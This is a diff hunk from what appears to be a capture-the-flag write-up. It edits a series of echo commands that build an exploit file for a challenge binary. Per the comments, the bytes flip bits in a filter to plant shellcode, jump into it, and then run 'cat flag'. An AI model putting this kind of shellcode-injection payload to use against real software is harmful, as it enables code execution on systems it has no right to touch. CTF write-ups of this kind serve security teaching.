@@ -240,7 +240,7 @@ echo -ne 'ADD\x05qqqwc' >> exploit.bin  # start flipping bits..
 echo -ne 'ADD\x05qqeFJ' >> exploit.bin  # ok, now the filter contains the shellcode
 echo -ne 'DBG\x01\xeb'  >> exploit.bin  # exit debug mode and fix byte to jump into the filter
 echo -ne 'FLG\x01x'     >> exploit.bin  # you need 15 useles commands to reach the end of the main loop
-echo -ne 'cat FLAG.1567' >> exploit.bin # I guess before you want to use ls to find the name..
+echo -ne 'cat flag\x0a\x0aquit\x0a' >> exploit.bin 
 ```
 
 
